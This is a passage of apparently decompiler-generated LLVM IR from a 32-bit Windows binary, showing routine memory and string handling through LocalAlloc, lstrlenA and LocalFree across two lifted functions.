  %163 = ptrtoint i8* %stack_var_-8.2.reload to i32, !insn.addr !1248
  store i32 %163, i32* %ebx.3.reg2mem, !insn.addr !1248
  br label %dec_label_pc_409cd0, !insn.addr !1248

dec_label_pc_409cd0:                              ; preds = %dec_label_pc_409ccd, %dec_label_pc_409b70
  %ebx.3.reload = load i32, i32* %ebx.3.reg2mem
  %164 = call i32* @LocalFree(i32* %9), !insn.addr !1249
  %165 = sub i32 %ebx.3.reload, %1, !insn.addr !1250
  ret i32 %165, !insn.addr !1251

dec_label_pc_409ce3:                              ; preds = %dec_label_pc_409af0
  ret i32 0, !insn.addr !1252
}

define i32 @function_409cf0() local_unnamed_addr {
dec_label_pc_409cf0:
  %ecx.1.reg2mem = alloca i8, !insn.addr !1253
  %eax.0.reg2mem = alloca i8, !insn.addr !1253
  %esi.0.reg2mem = alloca i32, !insn.addr !1253
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1254
  %2 = call i32 @lstrlenA(i8* %1), !insn.addr !1255
  %3 = call i32* @LocalAlloc(i32 64, i32 %2), !insn.addr !1256
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1256
  %5 = call i32 @function_409af0(), !insn.addr !1257
  %6 = ashr i32 %5, 31, !insn.addr !1258
  %7 = sub i32 %5, %6, !insn.addr !1259
  %8 = sdiv i32 %7, 2, !insn.addr !1260
  %.off = add i32 %7, 1
  %9 = icmp ult i32 %.off, 3
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !1261
  br i1 %9, label %dec_label_pc_409d9a, label %dec_label_pc_409d20, !insn.addr !1261

